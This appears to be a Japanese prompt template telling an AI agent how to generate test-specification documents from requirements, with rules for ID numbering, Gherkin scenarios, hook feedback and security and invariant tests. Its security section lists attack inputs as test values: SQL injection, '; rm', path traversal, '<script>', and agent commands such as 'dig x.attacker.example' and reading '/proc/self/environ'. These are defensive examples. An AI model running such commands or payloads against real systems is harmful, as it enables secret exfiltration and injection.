# テスト定義書生成プロンプト

要件定義書を Read ツールで読み込み、テスト定義書を生成して TEST_SPEC_PATH に書き出してください。

要件定義書（全ファイルを順に Read ツールで読み込み、内容を統合してください）:
{REQUIREMENTS_PATHS}
出力先: `{TEST_SPEC_PATH}`（未指定の場合は REQUIREMENTS_PATHS の先頭ファイル名を元に `doc/test-spec/{同名}.md` とする）

**生成モード: `{KIND}`**（`feature` = 新規生成 / `change` = 差分更新 / `fix` = 不具合修正）

`{KIND}` が `change` または `fix` で出力先ファイルが既に存在する場合は**差分更新モード**で動作すること：

- 既存ファイルを最初に Read し、**既存の ID（TC-NNN）と項目は一切振り直さない・削除しない**
- 変更対象: `{CHANGED_REQ_IDS}`（requirements の差分。`added` / `modified` / `removed` 付き）
  - `added` の REQ → 新しい ID を**既存の最大番号 + 1** から採番して追記
  - `modified` の REQ → その REQ を `covers` に持つ既存項目だけを書き換え、他はそのまま
  - `removed` の REQ → 該当項目を削除せず、見出しに `（廃止: REQ-NNN 削除）` を付けて残す（履歴の追跡用。次回 compliance で除外対象になる）
- 追加・変更した項目には frontmatter に `status: added` / `status: modified` を付け、変更していない項目には付けない（reviewer と consistency の Impact Analysis がこれを見る）
- 最終回答に「追加した ID / 変更した ID / 触っていない ID 数」を必ず書く

`{KIND}` が `feature`、または出力先ファイルが存在しない場合は、従来どおり全文を新規生成する。

**`fix` のときの追加ルール:**

不具合の説明: `{FIX_DESCRIPTION}`

- 要件定義書は変更されていない前提。不具合を**再現するテストケース**を「## 不具合再現テストケース」セクションに追加する（通常 1〜3 件）
- `covers` には不具合が違反している既存の REQ-ID を入れる。該当する REQ が特定できなければ `covers: []` とし、最終回答で「対応 REQ なし」と明記する（consistency が人間に確認する）
- 期待結果は「修正後にどう振る舞うべきか」を具体値で書く。現状の誤った振る舞いは `**現状（不具合）**:` 行に併記する

**テスト定義書フォーマット:**

テストケースのタイトル（frontmatter の `title` と本文の `### TC-NNN:` 見出し）は **`正常系: 〜` / `異常系: 〜` / `境界値: 〜` / `セキュリティ: 〜` / `パフォーマンス: 〜` / `不変条件: 〜` / `不具合再現: 〜`** のいずれかの接頭辞で始めること（reviewer のリント対象）。

各テストケースには **Gherkin 形式の Given-When-Then シナリオ**を含めること。これにより仕様が機械可読になり、BDD フレームワークとの連携が可能になります。

```markdown
---
doc_type: test-spec
covers: [REQ-001, REQ-002]
test_cases:
  - id: TC-001
    title: "正常系: （テストケースタイトル）"
    covers: [REQ-001]
  - id: TC-002
    title: "異常系: （テストケースタイトル）"
    covers: [REQ-002]
    status: added        # 差分更新モードで追加した項目のみ
---

# テスト定義書

## 正常系テストケース

### TC-001: 正常系: （テストケース名）
**対象要件**: REQ-001
**API**: API-001

```gherkin
Feature: （機能名）
  Scenario: （シナリオ名）
    Given （前提条件）
    When （操作）
    Then （期待結果）
    And （追加の期待結果）
```

**具体的な入出力値:**
- 入力: `{"field": "value"}`
- 期待出力: `{"id": "123", "status": "ok"}`

## 異常系テストケース

### TC-00N: ...

（Gherkin フォーマット必須、入出力値必須）

## 境界値テスト

## セキュリティテスト

（下の「セキュリティテストの書き方」に従う。攻撃の入力と、拒否・無害化されたことの観測を具体値で書く）

## 不変条件テストケース

（要件定義書の `REQ-NNN: 不変条件: 〜` ごと。下の「不変条件テストの書き方」に従う）

## パフォーマンステスト（必要な場合）
```

**セキュリティテストの書き方:** セキュリティは、検出器（SAST）の警告の件数ではなく、**攻撃が通らないことをテストで確かめる**。要件のうち次に当たるものごとに、`セキュリティ: 〜` の TC を書く。

| 要件の中身 | 書く TC（最低限） |
|---|---|
| 認証が要るもの | 未認証・期限切れ・改ざんしたトークンでの呼び出しが拒否される |
| 認可（本人・権限・所属で見えるものが変わる） | 他人の ID・権限の無い役割・別テナントでの読み書きが拒否され、データが返らない |
| 外部の入力を解釈系（SQL・シェル・パス・URL・HTML・テンプレート・正規表現）に渡すもの | 代表的な攻撃の入力（`' OR 1=1 --`・`; rm`・`../`・`file://`・`<script>`・制御文字・極端に長い値）が拒否または無害化される |
| 秘密情報（トークン・個人情報・照会の本文）を扱うもの | ログ・エラー・応答・`repr` に出ない |
| 許可リスト・サニタイザ・サンドボックス（危険な操作を入力の検査で止める部品） | 下記 |
| 攻撃の成否・認可・検知を**判定**するもの（結論が「問題なし」になりうる処理） | ① 判定できる入力と判定できない入力（必要な項目が無い・対応表に無い）が**混ざった**入力で、判定できない分が「未判定」として結果に出て、全体が「問題なし」にならない ② 判定の単位の一部が失敗する（DB に接続できない・権限エラー・タイムアウト）とき、全体が「問題なし」にならない（失敗の種類ごとに 1 つ） |
| LLM の出力を使うもの | LLM が型の違う出力（数値の項目に文字列・null・JSON の配列・列挙に無い値）や、出力先の上限を超える長さ・記号（`<!channel>`・`<script>`）を返したとき、処理が落ちずに安全側（要確認）になり、出力先に素通しされない。LLM の入力に入る外部データが極端に長いとき、判定・通知が止まらない |
| エージェント（Claude Code など）にツール・コマンドを許可するもの | 許可した各コマンドで、任意の宛先へ送る書き方（`dig x.attacker.example`・`dig @host`・`curl`）と秘密のファイルを読む書き方（`/proc/self/environ`）が拒否される。許可の一覧そのものを固定する TC |

- **許可リスト・サニタイザ・サンドボックスは、本物のエンジンに対して確かめる TC を必ず 1 つ以上置く。** 自前の構文解析やモックだけで確かめると、エンジン側の解釈（SQL の名前解決・シェルの展開・URL の正規化など）とのずれを見落とす。2026-11 の run では、SQL の関数の許可リストを構文木だけで検査していたため、列の記法やスコープの解決を使った迂回が 5 往復続けて見つかった。TC には `**実行環境**: 本物の {エンジン名}（例: PostgreSQL 13・bash）` と書き、Then に「エンジンで実行されない（副作用が起きない）」ことを観測する方法（実行されたら残る痕跡・権限エラー・実行計画など）を書く
- 攻撃の入力は具体値で書く（「不正な入力」で済ませない）。期待結果は「エラーになる」ではなく、拒否の種類（ステータス・エラーコード）と、副作用が無いこと（データが返らない・書き換わらない・コマンドが走らない）を書く

**不変条件テストの書き方:** 要件定義書の `REQ-NNN: 不変条件: 〜` は、部品を組み合わせたときにだけ確かめられる。部品ごとの TC（正常系・異常系）が全部通っても、不変条件は破れうる（2026-11 の photo-incident-triage では、起動失敗・時間の予算・判定の一部の失敗の 3 件が、部品ごとのテスト 1.8 万件をすべて通っていた）。不変条件ごとに `不変条件: 〜` の TC を書く。

- **障害注入**: 不変条件にかかわる外部依存と段（DB・キュー・外部 API・LLM・通知先・子プロセス）を要件定義書・インフラ仕様書から列挙し、**1 つずつ落とす TC** を書く（落とし方: 接続できない・タイムアウト・4xx・5xx・不正な応答）。Then には、不変条件が守られたこと（例: 通知か PagerDuty のどちらかが送られた・再配信待ちになった・結論が「問題なし」でない）を観測する方法を書く。「エラーになる」で済ませない
- **範囲**: TC に `**範囲**: システム（{かかわる部品}）` と書く。テストは入口（ハンドラ・CLI・メッセージの受信）から出口（通知・保存）まで通しで動かし、落とすのは外部依存の境界だけにする（部品の中をモックで差し替えると、部品の間のずれを見落とす）
- **時間の予算**: 時間の予算の不変条件には、各段の最悪の待ち時間（タイムアウト × 再試行 ＋ 待ち）を設定値から合計し、全体の上限以内であることを確かめる TC を書く（値は共通部品の台帳・設定から読み、テストに数値を写さない。設定を変えたらテストが追随する）。あわせて、外部依存が上限まで遅いときに最後の出口（通知など）まで届くことを、時計を差し替えて確かめる
- **副作用は 1 回**: 同じ入力を 2 回流し（再配信・再試行）、外部への副作用が 1 回であることを数える
- 不変条件 1 つにつき、落とす依存の数だけ TC ができる。依存が多いときは、同じ観測の TC を Scenario Outline（Examples の表）にまとめてよい

完了したら SendMessage は使わず、最終回答として次を返してください（呼び出し元がこの回答を受け取ってレビュアーを起動します）：

```
テスト定義書の生成が完了しました。対象ファイル: {TEST_SPEC_PATH}
（生成した ID 一覧・判断に迷った点・要件定義書に不足していた情報を箇条書き）
```

修正依頼を受け取って再実行する場合も、修正内容の要約を同じ形式で返してください。

Write 直後に「dev-flow hook: ... がスキーマ違反です」というフィードバックが返った場合は、列挙された ERROR をすべて直して**同じファイルを書き直す**こと（frontmatter の ID 形式・重複、`covers` の REQ が要件定義書に存在するか、本文に `### ID:` 見出しがあるか）。

**hook のフィードバックへの対応:**
- ファイルを Write / Edit すると hook（`doc-validate.py`）が frontmatter と本文を検証し、違反があれば「ファイル:行番号: 内容 → 直し方」の形で差し戻す。直し方に従って**同じファイルを書き直す**
- 文書が大きく分割して書く場合は、ファイル末尾に `<!-- dev-flow: in-progress -->` を置く。frontmatter と本文の対応（見出しの有無）が完成まで WARN 扱いになる。**完成したら必ずマーカーを削除する**（残っていると compliance の `--all` 検証で ERROR）
- **同じ違反で 3 回差し戻されたら**、修正方針を変えずに書き直すのをやめ、最終回答で `status: "blocked"` と違反内容・試した修正を報告する
- **提出前のカバレッジ確認**: 書き終えたら hook の WARN に「どの covers にも無い REQ があります」が出ていないか確認する。出ていれば、その REQ をカバーする項目を足すか、この文書の対象外である理由を本文に書く（黙って提出しない。実戦で REQ-021 が仕様書とテスト定義書の両方から漏れ、レビュー差し戻しを 2 往復した）
